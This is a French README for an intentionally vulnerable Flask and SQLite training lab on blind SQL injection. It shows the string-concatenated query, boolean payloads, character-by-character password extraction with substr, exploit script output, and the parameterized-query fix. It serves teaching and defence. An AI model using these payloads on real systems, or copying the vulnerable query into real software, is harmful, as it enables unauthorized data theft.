# Lab Blind SQL Injection (Flask + SQLite + Docker)

## Présentation

Ce projet démontre une **vulnérabilité de Blind SQL Injection (injection SQL aveugle)** dans une application web volontairement vulnérable.

Le lab simule un scénario réaliste où un attaquant peut **extraire des informations sensibles d'une base de données sans voir directement les résultats SQL ni les erreurs**.

L'application est développée avec :

* **Python Flask** : application web
* **SQLite** : base de données
* **HTML** : interface web
* **Python** : script d'exploitation automatique

Ce lab montre comment un attaquant peut **reconstruire un mot de passe caractère par caractère** uniquement en analysant la réponse de l'application.

---

## Architecture du lab

```text
blind-sqli-lab
│
├── app.py
├── exploit.py
├── users.db
├── Dockerfile
├── requirements.txt
├── README.md
├── .gitignore
│
├── templates
│   ├── index.html
│   └── about.html
│
└── venv/       ```

---

## Code vulnérable

La vulnérabilité se trouve dans la requête SQL suivante :

```python
query = f"SELECT * FROM users WHERE username = '{username}'"
```

L'entrée utilisateur est directement concaténée dans la requête SQL, ce qui permet une **injection SQL**.

Requête normale :

```sql
SELECT * FROM users WHERE username = 'admin'
```

Si un attaquant injecte :

```text
admin' OR '1'='1
```

La requête devient :

```sql
SELECT * FROM users WHERE username = 'admin' OR '1'='1'
```

Cette condition est toujours vraie.

---

## Structure de la base de données

La base SQLite contient une table :

```text
users
```

Structure :

```text
id INTEGER PRIMARY KEY
username TEXT
password TEXT
```

Exemple de données :

```text
1 | admin    | secret123
2 | john     | password1
3 | alice    | alice123
...
20 | robert  | robertpass
```

---

## Lancer le lab

### 1. Activer l'environnement virtuel

```bash
source venv/bin/activate
```

### 2. Démarrer l'application

```bash
python app.py
```

Le serveur démarre sur :

```text
http://127.0.0.1:5000
```

---

## Interface web

L'application affiche un formulaire simple :

```text
Blind SQL Injection Lab

[ champ username ]

[ Search ]
```

L'application retourne seulement deux réponses :

```text
User exists
User not found
```

Aucune erreur SQL ni résultat de requête n'est affiché.

---

## Blind SQL Injection

Comme l'application ne retourne pas les résultats SQL, l'attaquant doit **déduire les informations en analysant les réponses de l'application**.

### Condition vraie

Payload :

```text
admin' AND 1=1--
```

Requête exécutée :

```sql
SELECT * FROM users WHERE username='admin' AND 1=1
```

Réponse :

```text
User exists
```

### Condition fausse

Payload :

```text
admin' AND 1=2--
```

Requête exécutée :

```sql
SELECT * FROM users WHERE username='admin' AND 1=2
```

Réponse :

```text
User not found
```

L'attaquant peut donc **tester des conditions vraies ou fausses**.

---

## Extraction du mot de passe

Pour extraire le mot de passe, l'attaquant teste chaque caractère.

Exemple :

```text
admin' AND substr(password,1,1)='s'--
```

Si la réponse est :

```text
User exists
```

Alors le premier caractère du mot de passe est **s**.

Cette méthode est répétée pour chaque caractère.

---

## Exploitation automatique

Le projet contient un script d'exploitation automatique.

Exécuter :

```bash
python exploit.py
```

Résultat :

```text
Found: s
Found: se
Found: sec
Found: secr
Found: secre
Found: secret
Found: secret1
Found: secret12
Found: secret123

Password = secret123
```

Le script envoie plusieurs requêtes HTTP et reconstruit le mot de passe automatiquement.

Ce principe est similaire au fonctionnement d'outils comme **sqlmap** lors d'un pentest.

---

## Étapes de l'attaque

1. Identifier le point d'injection (champ username)
2. Tester des conditions booléennes
3. Déduire les réponses de la base de données
4. Extraire les caractères un par un
5. Reconstruire le mot de passe complet

---

## Problèmes de sécurité

Cette application présente plusieurs failles :

* concaténation directe des entrées utilisateur
* absence de validation des entrées
* absence de requêtes préparées
* fuite d'information via le comportement de l'application

---

## Comment prévenir la SQL Injection

La solution consiste à utiliser des **requêtes préparées (paramétrées)**.

Exemple sécurisé :

```python
cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
```

Autres bonnes pratiques :

* validation des entrées
* utilisation d'ORM
* firewall applicatif (WAF)
* gestion sécurisée des erreurs

---

## Objectif pédagogique

Ce projet est conçu **uniquement à des fins éducatives** afin de comprendre le fonctionnement des attaques SQL Injection et les méthodes de protection.

Ces techniques ne doivent jamais être utilisées sur des systèmes sans autorisation.
